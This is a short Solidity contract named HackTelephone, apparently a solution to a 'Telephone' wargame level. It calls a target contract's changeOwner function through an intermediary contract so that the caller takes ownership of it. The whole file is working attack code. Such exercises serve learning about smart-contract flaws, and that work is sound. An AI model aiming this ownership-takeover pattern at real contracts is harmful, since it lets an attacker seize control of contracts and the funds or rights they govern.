// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackTelephone {
    address targetContract;

    constructor(address _targetContract) public {
        targetContract = _targetContract;
    }

    function hack() public {
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(address)",
            msg.sender
        );
        (bool success, ) = targetContract.call(payload);
        require(success, "Failed to change owner");
    }
}
